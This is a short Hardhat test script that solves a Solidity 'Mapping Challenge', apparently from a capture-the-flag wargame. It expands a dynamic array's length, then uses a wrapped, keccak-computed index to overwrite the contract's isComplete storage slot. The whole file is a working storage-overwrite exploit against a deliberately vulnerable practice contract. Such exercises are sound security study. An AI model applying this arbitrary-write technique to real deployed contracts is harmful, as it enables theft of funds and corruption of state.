const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");
describe("Mapping Challenge", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        contract = await (await ethers.getContractFactory("MappingChallenge")).deploy();
        await contract.deployed();

});
    describe("Complete Challenge", function() {
        it("Should complete the challenge", async function() {

            await contract.set(ethers.constants.MaxUint256.sub(1), 1);
            slotOfMap = ethers.BigNumber.from(ethers.utils.solidityKeccak256(["uint"], [1]));
            indexOfComplete = ethers.constants.MaxUint256.sub(slotOfMap).add(1);
            await contract.set(indexOfComplete, 1);
            expect(await contract.isComplete()).to.equal(true);
        });
    });
});